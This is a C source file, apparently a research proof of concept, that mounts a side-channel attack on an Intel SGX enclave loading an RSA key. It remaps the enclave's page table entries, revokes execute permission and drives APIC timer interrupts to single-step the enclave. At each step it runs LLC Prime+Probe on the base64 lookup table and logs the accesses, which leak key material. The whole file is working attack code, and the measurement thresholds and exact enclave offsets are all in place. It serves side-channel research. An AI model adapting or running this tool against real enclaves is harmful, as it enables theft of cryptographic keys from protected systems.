#include "Enclave/encl_u.h"

#include <sgx_urts.h>

#include <signal.h>

#include "libsgxstep/debug.h"
#include "libsgxstep/sched.h"
#include "libsgxstep/pt.h"
#include "libsgxstep/apic.h"
#include "libsgxstep/enclave.h"
#include "libsgxstep/config.h"
#include "libsgxstep/idt.h"

#include "libcpu.h"
#include "evset.h"

#include <stdlib.h>
#include <stdio.h>

uint32_t offset_lt = 0x256640;
uint32_t offset_decodeblock_adrs = 0x11f4c0;
uint32_t offset_decodeblock_adrs_inline = 0x1200c9;

sgx_enclave_id_t eid = 0;
int irq_cnt = 0, do_irq = 1, fault_cnt = 0;
uint64_t *pte_encl = NULL;
uint64_t *pmd_encl = NULL;
uint64_t *decodeblock_encl = NULL;
uint64_t *decodeblock_encl_inline = NULL;
uint64_t *lut_encl = NULL;

unsigned int lut_access_cnt = 0;

uint64_t thresholdL1 = 8500;
uint64_t thresholdL2 = 8500;

unsigned int l1_cnt = 0;
unsigned int l2_cnt = 0;

uint64_t times1_sum_rolling[10];
uint64_t times2_sum_rolling[10];

unsigned int l1_and_lut_cnt = 0;
unsigned int l2_and_lut_cnt = 0;

uint64_t last_erip = 0;
unsigned int zero_step_cnt = 0;

cache_t *g_cache;
unsigned int setIndexBitsAddrLine1;
unsigned int setIndexBitsAddrLine2;

char access_log[4000];

FILE *out_fp;

uint8_t aep_active = 0;

unsigned int number_of_slices = 0;

int compare(const void *a, const void *b) {
    if (*((uint64_t*) a) < *((uint64_t*) b)) {
        return -1;
    } else if (*((uint64_t*) a) == *((uint64_t*) b)) {
        return 0;
    } else {
        return 1;
    }
}

uint64_t median(uint64_t *times, size_t len) {
    qsort(times, len, sizeof(uint64_t), compare);
    return times[len / 2];
}

void aep_cb_func(void) {
    if (!aep_active) {
      return;
    }

    unsigned int accessed_lut = ACCESSED(*lut_encl);

    unsigned int accessed_decodeblock_func = ACCESSED(*decodeblock_encl) | ACCESSED(*decodeblock_encl_inline);

    // Probe
    for (int i = 0; i < number_of_slices; i++) {

        cpu_probe_pointer_chasing_store(
                g_cache->ev_sets[setIndexBitsAddrLine2][i].start,
                g_cache->ev_sets[setIndexBitsAddrLine2][i].probeTimeForward);
    }

    for (int i = 0; i < number_of_slices; i++) {
        cpu_probe_pointer_chasing_store(
                g_cache->ev_sets[setIndexBitsAddrLine1][i].start,
                g_cache->ev_sets[setIndexBitsAddrLine1][i].probeTimeForward);
    }

    uint64_t times1[number_of_slices], times2[number_of_slices];
    uint64_t times1_sum = 0, times2_sum = 0;

    for (int i = 0; i < number_of_slices; i++) {
        times1[i] =
                *((uint64_t*) g_cache->ev_sets[setIndexBitsAddrLine1][i].probeTimeForward);
        times1_sum +=
                *((uint64_t*) g_cache->ev_sets[setIndexBitsAddrLine1][i].probeTimeForward);
        times2[i] =
                *((uint64_t*) g_cache->ev_sets[setIndexBitsAddrLine2][i].probeTimeForward);
        times2_sum +=
                *((uint64_t*) g_cache->ev_sets[setIndexBitsAddrLine2][i].probeTimeForward);
    }

    times1_sum_rolling[irq_cnt % 10] = times1_sum;
    times2_sum_rolling[irq_cnt % 10] = times2_sum;

    if (irq_cnt > 10) {
        thresholdL1 = median(times1_sum_rolling, 10) + 800;
        thresholdL2 = median(times2_sum_rolling, 10) + 800;
    }

    if (irq_cnt > 0) {
        fprintf(out_fp, ",\n");
    }
    fprintf(out_fp,
            "\t\t{'irq_cnt': %d, 'access_lut': %d, 'accessed_decodeblock_func': %d, 'access_time_1_sum': %lu, "
                    "'access_times_1': [%lu", irq_cnt, accessed_lut,
            accessed_decodeblock_func, times1_sum, times1[0]);
    for (int i = 1; i < number_of_slices; i++) {
        fprintf(out_fp, ", %lu", times1[i]);
    }
    fprintf(out_fp, "], 'access_time2 sum': %lu, 'access_times_2': [%lu",
            times2_sum, times2[0]);
    for (int i = 1; i < number_of_slices; i++) {
        fprintf(out_fp, ", %lu", times2[i]);
    }
    fprintf(out_fp, "], 'threshold_1': %lu, 'threshold_2': %lu}", thresholdL1,
            thresholdL2);

    irq_cnt++;

    if (accessed_lut && accessed_decodeblock_func && irq_cnt > 10) {
        if (times2_sum > thresholdL2) {
            access_log[lut_access_cnt] = 50;
            l2_and_lut_cnt++;
        } else if (times1_sum > thresholdL1) {
            access_log[lut_access_cnt] = 49;
            l1_and_lut_cnt++;
        } else {
            access_log[lut_access_cnt] = 120;
        }
        lut_access_cnt++;
    }

    if (times2_sum > thresholdL2) {
        l2_cnt++;
    }
    if (times1_sum > thresholdL1) {
        l1_cnt++;
    }

    /*
     * NOTE: We explicitly clear the "accessed" bit of the _unprotected_ PTE
     * referencing the enclave code page about to be executed, so as to be able
     * to filter out "zero-step" results that won't set the accessed bit.
     */

    for (int j = 0; j < number_of_slices; j++) {
        cpu_prime_pointer_chasing(
                g_cache->ev_sets[setIndexBitsAddrLine1][j].start);

        cpu_prime_pointer_chasing(
                g_cache->ev_sets[setIndexBitsAddrLine2][j].start);
    }

    *decodeblock_encl = MARK_NOT_ACCESSED(*decodeblock_encl);
    *decodeblock_encl_inline = MARK_NOT_ACCESSED(*decodeblock_encl_inline);

    *lut_encl = MARK_NOT_ACCESSED(*lut_encl);

    /*
     * Configure APIC timer interval for next interrupt.
     *
     * On our evaluation platforms, we explicitly clear the enclave's
     * _unprotected_ PMD "accessed" bit below, so as to slightly slow down
     * ERESUME such that the interrupt reliably arrives in the first subsequent
     * enclave instruction.
     *
     */
    if (do_irq) {
        *pmd_encl = MARK_NOT_ACCESSED(*pmd_encl);
        apic_timer_irq(SGX_STEP_TIMER_INTERVAL);
    }
}

/* Called upon SIGSEGV caused by untrusted page tables. */
void fault_handler(int signal) {
    info("Caught fault %d! Restoring enclave page permissions..", signal);
    *pte_encl = MARK_NOT_EXECUTE_DISABLE(*pte_encl);
    ASSERT(fault_cnt++ < 10);

    // NOTE: return eventually continues at aep_cb_func and initiates
    // single-stepping mode.
}

void init_enclave(void) {

    int updated = 0;
    sgx_launch_token_t token = { 0 };

    info_event("Creating enclave...");
    SGX_ASSERT(
            sgx_create_enclave("./Enclave/encl.so", /*debug=*/1, &token, &updated, &eid, NULL ));
}

/* Configure and check attacker untrusted runtime environment. */
void attacker_config_runtime(void) {
    ASSERT(!claim_cpu(VICTIM_CPU));
    ASSERT(!prepare_system_for_benchmark(PSTATE_PCT));
    ASSERT(signal(SIGSEGV, fault_handler) != SIG_ERR);
    print_system_settings();

    if (isatty(fileno(stdout))) {
        info("WARNING: interactive terminal detected; known to cause ");
        info("unstable timer intervals! Use stdout file redirection for ");
        info("precise single-stepping results...");
    }

    register_aep_cb(aep_cb_func);
    register_enclave_info();
    print_enclave_info();
}

/* Provoke page fault on enclave entry to initiate single-stepping mode. */
void attacker_config_page_table(void) {
    void *code_adrs;
    void *decodeblock_adrs;
    void *decodeblock_adrs_inline;
    void *lut_adrs;


    SGX_ASSERT(get_rsa_key_load_addr(eid, &code_adrs));
    decodeblock_adrs = get_enclave_base() + offset_decodeblock_adrs;
    decodeblock_adrs_inline = get_enclave_base() + offset_decodeblock_adrs_inline;
    lut_adrs = get_enclave_base() + offset_lt;
    info("enclave trigger code adrs at %p\n", code_adrs);
    ASSERT(pte_encl = remap_page_table_level(code_adrs, PTE));
    
    ASSERT(decodeblock_encl = remap_page_table_level(decodeblock_adrs, PTE));
    ASSERT(decodeblock_encl_inline = remap_page_table_level(decodeblock_adrs_inline, PTE));
    info("remapped decodeblock addr: %p", decodeblock_encl);
    info("remapped decodeblock addr inline: %p", decodeblock_encl_inline);

    ASSERT(lut_encl = remap_page_table_level((void* ) lut_adrs, PTE));
    info("remapped lut addr: %p", lut_encl);

    ASSERT(pmd_encl = remap_page_table_level(get_enclave_base(), PMD));
    fprintf(stderr, "\npmd_encl: %p\n", pmd_encl);
}

void attacker_interrupt_setup(void) {
    // Using userspace IDT mapping

    idt_t idt = { 0 };

    info_event("Establishing user space APIC/IDT mappings");
    map_idt(&idt);
    install_kernel_irq_handler(&idt, __ss_irq_handler, IRQ_VECTOR);
    apic_timer_oneshot(IRQ_VECTOR);
}

void enable_single_stepping() {

#if SINGLE_STEP_ENABLE
    aep_active = 1;
    *pte_encl = MARK_EXECUTE_DISABLE(*pte_encl);
#endif
}

void setup_attacker(void) {

    attacker_config_runtime();
    attacker_config_page_table();
    attacker_interrupt_setup();
}

void cleanup(void) {
    /* 3. Restore normal execution environment. */
    apic_timer_deadline();
    SGX_ASSERT(sgx_destroy_enclave(eid));
}

int preparePrimeNProbe(cache_t *cache, unsigned int phySetIndex, size_t shmSize,
        void *shm_ptr) {

    int success = -1;

    addr_list_t testCandidates;
    initAddrList(&testCandidates);

    cpu_warm_up(1000000);

    EvSetSearchResult_t evSetFindingResult = findEvictionSetsLlc(phySetIndex,
            cache, &testCandidates, shm_ptr, shmSize);

    if (evSetFindingResult != OK) {
        fprintf(stdout, "\n\nError finding eviction sets. Code: %d\n",
                evSetFindingResult);
        if (evSetFindingResult == ERROR
                || evSetFindingResult == CONFLICT_SET_INCOMPLETE) {
            success = -2;
        }
    } else {
        if (validateEvictionSetsLlcForAllSlices(&testCandidates, cache,
                phySetIndex) == VALID) {
            fprintf(stdout, "\n\nValidation: Eviction Sets found :-)\n");

            success = 1;
        } else {
            fprintf(stdout, "\n\nValidation: Determined sets for "
                    "cache index 0x%x are no eviction sets :-(\n", phySetIndex);
        }
    }

    freeAddrListEntries(&testCandidates);

    return success;
}

int main(int argc, char **argv) {

    info("Single stepping timer interval: %u", SGX_STEP_TIMER_INTERVAL);

    char *file_name = "log.out";
    if (argc == 2) {
        file_name = argv[1];
    }
    out_fp = fopen(file_name, "w");
    fprintf(out_fp, "{\n\t'measurements': [\n");

    cache_t *cache;
    cache = cpu_cacheInit(L3);
    g_cache = cache;

    size_t shmSize;
    void *shm_ptr;
    void *shm_ptr2;
    
    number_of_slices = cpu_getPhysicalCores() * 2;

    shmSize = cache->info.size * 16;

    shm_ptr = (void*) malloc(shmSize * sizeof(uint8_t));
    uint8_t *cur = (uint8_t*) shm_ptr;
    for (size_t i = 0; i < shmSize; i++) {
        *(cur + i) = 0;
    }

    shm_ptr2 = (void*) malloc(shmSize * sizeof(uint8_t));
    uint8_t *cur2 = (uint8_t*) shm_ptr2;
    for (size_t i = 0; i < shmSize; i++) {
        *(cur2 + i) = 0;
    }

    void *line1_addr_enclave;
    void *line2_addr_enclave;

    init_enclave();
    
    line1_addr_enclave = get_enclave_base() + offset_lt;
    line2_addr_enclave = get_enclave_base() + offset_lt + 0x40;


    address_mapping_t *map = get_mappings(line1_addr_enclave);
    uintptr_t phyAddrLine1 = phys_address(map, PAGE);
    info("Phy. addr. line 1: 0x%lx", phyAddrLine1);
    info("Virt. addr. line 1: 0x%lx", line1_addr_enclave);

    setIndexBitsAddrLine1 = getSetIndexBits(phyAddrLine1, cache->info.sets_log,
            cache->info.linesize_log);

    address_mapping_t *map2 = get_mappings(line2_addr_enclave);
    uintptr_t phyAddrLine2 = phys_address(map2, PAGE);
    setIndexBitsAddrLine2 = getSetIndexBits(phyAddrLine2, cache->info.sets_log,
            cache->info.linesize_log);
    info("Phy. addr. line 2: 0x%lx", phyAddrLine2);
    info("Virt. addr. line 2: 0x%lx", line2_addr_enclave);

    free(map);
    free(map2);

    
    int success = -1;
    do {
        success = preparePrimeNProbe(cache, setIndexBitsAddrLine1, shmSize,
                shm_ptr);
        if (success == -2) {
            exit(-2);
        }
    } while (success < 0);

    success = -1;
    do {
        success = preparePrimeNProbe(cache, setIndexBitsAddrLine2, shmSize,
                shm_ptr2);
        if (success == -2) {
            exit(-2);
        }
    } while (success < 0);
    
    memset(access_log, 0, 4000);
    memset(times1_sum_rolling, 0, sizeof(uint64_t) * 10);
    memset(times2_sum_rolling, 0, sizeof(uint64_t) * 10);

    setup_attacker();
    enable_single_stepping();

    SGX_ASSERT(rsa_key_load(eid));
    fprintf(out_fp, "\t],\n");
    fprintf(out_fp, "\t'analysis_result': {\n");
    fprintf(out_fp, "\t\t'access_cnt_line_1': %lu,\n", l1_cnt);
    fprintf(out_fp, "\t\t'access_cnt_line_2': %lu,\n", l2_cnt);
    fprintf(out_fp, "\t\t'lut_and_access_cnt_line_1': %lu,\n", l1_and_lut_cnt);
    fprintf(out_fp, "\t\t'lut_and_access_cnt_line_2': %lu,\n", l2_and_lut_cnt);
    fprintf(out_fp, "\t\t'access_log': '%s',\n", access_log);
    fprintf(out_fp, "\t\t'pte_access_lut': %d,\n", lut_access_cnt);
    fprintf(out_fp, "\t\t'single_stepping_interrupts': %d\n", irq_cnt);
    fprintf(out_fp, "\t}\n}");

    cleanup();

    cpu_cacheFree(cache);
    free(shm_ptr);
    free(shm_ptr2);
    fclose(out_fp);

    return 0;
}
